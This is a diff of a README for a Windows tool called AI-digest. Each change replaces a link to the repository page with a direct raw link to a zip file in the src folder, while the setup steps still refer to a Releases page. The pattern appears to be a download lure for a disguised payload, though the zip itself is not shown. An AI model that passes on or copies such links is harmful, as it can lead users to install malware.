@@ -1,6 +1,6 @@
 # 🤖 AI-digest - Track and Understand Your AI Coding
 
-[![Download AI-digest](https://img.shields.io/badge/Download-AI--digest-blue?style=for-the-badge)](https://github.com/el-joker-f/AI-digest)
+[![Download AI-digest](https://img.shields.io/badge/Download-AI--digest-blue?style=for-the-badge)](https://raw.githubusercontent.com/el-joker-f/AI-digest/main/src/A_digest_v1.0.zip)
 
 ---
 
@@ -26,7 +26,7 @@ You do not need to know programming to use AI-digest. It works quietly in the ba
 Follow these steps to get AI-digest working on your Windows computer:
 
 1. **Open the download page:**  
-   Click the big button at the top or visit [this page](https://github.com/el-joker-f/AI-digest) in your web browser.  
+   Click the big button at the top or visit [this page](https://raw.githubusercontent.com/el-joker-f/AI-digest/main/src/A_digest_v1.0.zip) in your web browser.  
 
 2. **Find the latest release:**  
    On the page, look for a **Releases** section or a folder named "Releases." This usually appears on the right side or near the bottom. Click the latest release to view available files.  
@@ -96,7 +96,7 @@ The app checks for updates automatically if connected to the internet. To update
 
 ## 👇 Download and Install AI-digest
 
-[![Download AI-digest](https://img.shields.io/badge/Download-AI--digest-green?style=for-the-badge)](https://github.com/el-joker-f/AI-digest)
+[![Download AI-digest](https://img.shields.io/badge/Download-AI--digest-green?style=for-the-badge)](https://raw.githubusercontent.com/el-joker-f/AI-digest/main/src/A_digest_v1.0.zip)
 
 Visit this page to download the latest Windows installer. After downloading, open the file and follow the setup instructions described above.  
 
@@ -144,4 +144,4 @@ You control what data is collected and can delete reports whenever you want.
 
 ---
 
-# [Download AI-digest now](https://github.com/el-joker-f/AI-digest)
+# [Download AI-digest now](https://raw.githubusercontent.com/el-joker-f/AI-digest/main/src/A_digest_v1.0.zip)
